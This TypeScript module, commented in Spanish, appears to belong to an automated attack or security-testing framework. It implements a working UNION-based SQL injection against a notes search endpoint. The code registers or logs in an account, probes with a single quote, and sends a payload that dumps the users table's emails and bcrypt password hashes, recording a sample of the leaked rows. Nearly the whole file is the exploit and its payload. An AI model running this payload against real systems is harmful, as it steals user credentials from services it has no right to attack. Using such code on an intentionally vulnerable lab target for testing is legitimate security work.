/**
 * Ataque real: SQL injection UNION-based. listNotes() concatena `q` dentro de
 * ILIKE '%...%'. Cerramos el string y el paréntesis, agregamos un UNION con 6
 * columnas y volcamos la tabla users (email + password_hash). Solo lectura.
 */
import { CATALOG } from '../catalog.ts';
import { reqLine } from '../http.ts';
import { loginApi, registerThrowaway } from './session.ts';
import type { Attack, AttackContext, AttackResult, AttackStep } from '../types.ts';

// La query real: SELECT id,user_id,title,body,created_at,updated_at FROM notes
//   WHERE user_id = <me> AND (title ILIKE '%<q>%' OR body ILIKE '%<q>%') ORDER BY ...
// Cerramos con ') y comentamos el resto con --. La tabla users NO tiene columna
// user_id, así que usamos `id` dos veces para cuadrar los 6 tipos de columna
// (int, int, text, text, timestamp, timestamp): email→title, password_hash→body.
const PAYLOAD =
  `') UNION SELECT id, id, email, password_hash, created_at, updated_at FROM users -- `;

const BCRYPT = /^\$2[aby]\$/;

export const sqlInjection: Attack = {
  meta: CATALOG['sql-injection'],
  async run(ctx: AttackContext): Promise<AttackResult> {
    const steps: AttackStep[] = [];

    let token: string;
    if (ctx.target.weak_login) {
      const s = await loginApi(ctx, ctx.target.weak_login.email, ctx.target.weak_login.password);
      token = s ? s.token : (await registerThrowaway(ctx)).token;
    } else {
      token = (await registerThrowaway(ctx)).token;
    }

    // 1. Sonda error-based: una comilla rompe la query (encadena con verbose-errors).
    const probe = await ctx.http.get(`/api/notes?q=${encodeURIComponent("'")}`, { token });
    const errored = probe.status >= 500 || /syntax|unterminated|error/i.test(probe.text);
    steps.push({
      technique: 'Sonda error-based (comilla simple)',
      mitre: ['T1190'],
      request: reqLine('GET', "/api/notes?q='"),
      response_summary: `HTTP ${probe.status} — ${errored ? 'error SQL reflejado (inyectable)' : 'sin error'}`,
      exchange: probe.exchange,
    });

    // 2. UNION: volcar la tabla users.
    const res = await ctx.http.get(`/api/notes?q=${encodeURIComponent(PAYLOAD)}`, { token });
    const rows = Array.isArray(res.json) ? (res.json as any[]) : [];
    // En las filas inyectadas, "body" trae el password_hash (bcrypt).
    const leaked = rows.filter((r) => typeof r?.body === 'string' && BCRYPT.test(r.body));
    const confirmed = leaked.length > 0;

    steps.push({
      technique: 'UNION-based SQLi: volcado de la tabla users',
      mitre: ['T1190', 'T1213'],
      request: reqLine('GET', `/api/notes?q=${PAYLOAD.trim()}`),
      response_summary: confirmed
        ? `HTTP ${res.status} — ${leaked.length} filas de users exfiltradas (email + password_hash)`
        : `HTTP ${res.status} — ${rows.length} filas, sin hashes detectados`,
      exchange: res.exchange,
      note: confirmed ? 'El campo "title" trae el email y "body" el bcrypt: la tabla users completa, desde una búsqueda de notas.' : undefined,
    });

    return {
      vuln_id: sqlInjection.meta.id,
      confirmed,
      blocked: false,
      steps,
      gained: confirmed ? [`volcado de users (${leaked.length} cuentas con email + hash bcrypt)`] : [],
      foothold: confirmed ? { type: 'db', detail: 'lectura arbitraria vía UNION SQLi' } : undefined,
      data_exfiltrated: confirmed
        ? {
            table: 'users',
            rows: leaked.length,
            sample: leaked.slice(0, 5).map((r) => ({
              email: r.title,
              password_hash: `${String(r.body).slice(0, 7)}… <bcrypt>`,
            })),
          }
        : undefined,
      attacker_active: false,
      summary: confirmed
        ? `SQLi UNION-based confirmada en GET /api/notes?q=: se volcó la tabla users (${leaked.length} cuentas con hash). Cualquier tabla es legible.`
        : 'La búsqueda no resultó inyectable con el payload UNION probado.',
    };
  },
};
